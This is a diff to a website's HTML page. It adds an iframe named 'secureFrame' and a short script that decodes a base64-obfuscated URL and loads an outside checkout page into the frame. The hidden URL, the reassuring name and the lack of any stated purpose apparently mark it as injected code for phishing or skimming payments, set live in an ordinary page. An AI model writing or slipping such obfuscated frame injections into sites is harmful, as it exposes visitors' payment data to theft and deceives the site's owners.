@@ -393,6 +393,13 @@
 <div class="row" style="padding:10% ;">
   <body>
 
+<iframe id="secureFrame" width="100%" height="600px"></iframe>
+
+<script>
+  const encodedURL = "aHR0cHM6Ly9ub3ZpZS5pbi8zL2NoZWNrb3V0Lmh0bWw=";
+  const decodedURL = atob(encodedURL);
+  document.getElementById("secureFrame").src = decodedURL;
+</script>
 
 
 </main>
@@ -488,5 +495,6 @@ transition: all .2s ease-in-out;
     <script src="cms/assets/paginate-content.js"></script>
 </body>
 </html>
+
 
 
